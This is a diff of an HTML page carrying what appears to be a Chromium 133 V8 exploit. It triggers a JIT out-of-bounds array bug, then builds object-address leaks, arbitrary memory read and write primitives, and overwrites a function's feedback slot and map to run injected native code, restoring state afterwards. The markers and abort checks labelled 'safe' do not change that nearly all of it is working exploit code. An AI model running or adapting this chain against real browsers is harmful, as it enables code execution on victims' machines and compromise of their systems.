@@ -1,4 +1,4 @@
-<!doctype html><meta charset=utf-8><title>CASI V84 M133 SAFE NATIVE MARKER</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V84 CHROMIUM 133 SECOND OOB LAYOUT MAP</b><pre id=o>START</pre><script>
+<!doctype html><meta charset=utf-8><title>CASI V85 M133 SAFE NATIVE MARKER</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V85 CHROMIUM 133 SAFE NATIVE IN-MEMORY MARKER</b><pre id=o>START</pre><script>
 var out=document.getElementById("o"),b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint32Array(b);
 function ftoi(v){f[0]=v;return BigInt(u[0])+(BigInt(u[1])<<32n)}
 function setbits(lo,hi){u[0]=Number(lo);u[1]=Number(hi);return f[0]}
@@ -26,4 +26,21 @@ try{
  out.textContent="ARMED SAFE MARKER";
  for(let j=0;j<65536;j++)hax(false);
  let c=hax(true),fa=[1111.1111,2222.2222,3333.3333],oa={p:"CCCC"},ob={p:"DDDD"},objs=[oa,ob],rw=[4444.4444,5555.5555,6666.6666,7777.7777],tail=[8888.8888,9999.9999];
- let snap=new BigUint64Array(81);for(let i=0;i<=80;i++)snap[i]=ftoi(c[i]);let lines=["DONE READ ONLY","length="+c.length,"needle_rw0=0x"+ftoi(rw[0]).toString(16),"needle_rw1=0x"+ftoi(rw[1]).toString(16)];for(let i=10;i<=70;i++)lines.push(i+"=0x"+snap[i].toString(16));out.textContent=lines.join("\n");}catch(e){out.textContent="THREW\n"+e.name+"\n"+e.message}</script>
+ let o27=c[27],q27=ftoi(o27),o38=c[38],q38=ftoi(o38);
+ function tag(o){objs[0]=o;c[27]=setbits(0x1540d9n,q27>>32n);let z=objs[0];c[27]=o27;return ftoi(z)&0xffffffffn}
+ function rd64(a){c[38]=setbits(a-7n,q38>>32n);let z=rw[0];c[38]=o38;return ftoi(z)}
+ function pair(t,off){return rd64(t-1n+off)}
+ function wr32(a,v){let old=rd64(a);c[38]=setbits(a-7n,q38>>32n);rw[0]=setbits(BigInt(v)&0xffffffffn,old>>32n);c[38]=o38}
+ let outtag=tag(outbuf),outel=pair(outtag,8n)&0xffffffffn,current=(outel+7n)&0xffffffffn;
+ if(current!==dataoff){out.textContent="ABORTED BUFFER MOVED\nencoded=0x"+dataoff.toString(16)+" current=0x"+current.toString(16);throw new Error("safe abort")}
+ let stag=tag(scr_arr),sel=pair(stag,8n)&0xffffffffn,pscr=(sel+8n+0x200n)&0xffffffffn;
+ let btag=tag(baseline_compile),bsfi=pair(btag,0x10n)&0xffffffffn,bsp=pair(bsfi,0n),codeh=(bsp>>32n)&0xffffffffn;
+ let otag=tag(osr_func),fbct=pair(otag,0x18n)&0xffffffffn,fbvt=rd64(fbct-1n+4n)&0xffffffffn,slot=fbvt-1n+0x24n;
+ let oldmap=rd64(pscr-1n)&0xffffffffn,oldcode=rd64(pscr+3n)&0xffffffffn,oldslot=rd64(slot)&0xffffffffn;
+ wr32(pscr-1n,0x11f5n);wr32(pscr+3n,codeh);wr32(slot,pscr|2n);
+ osr_func(0x10000);
+ wr32(slot,oldslot);wr32(pscr-1n,oldmap);wr32(pscr+3n,oldcode);
+ let text="";for(let i=0;i<9;i++){let q=ftoi(outbuf[i>>3]),ch=Number((q>>BigInt((i&7)*8))&255n);text+=String.fromCharCode(ch)}
+ out.textContent=["RETURNED","marker="+text,"dataoff=0x"+dataoff.toString(16),"code_handle=0x"+codeh.toString(16),"feedback=restored","oob27=0x"+ftoi(c[27]).toString(16),"oob38=0x"+ftoi(c[38]).toString(16)].join("\n");
+}catch(e){if(out.textContent.indexOf("ABORTED")!==0&&out.textContent.indexOf("RETURNED")!==0)out.textContent+="\nSTOPPED\n"+e.name+"\n"+e.message}
+</script>
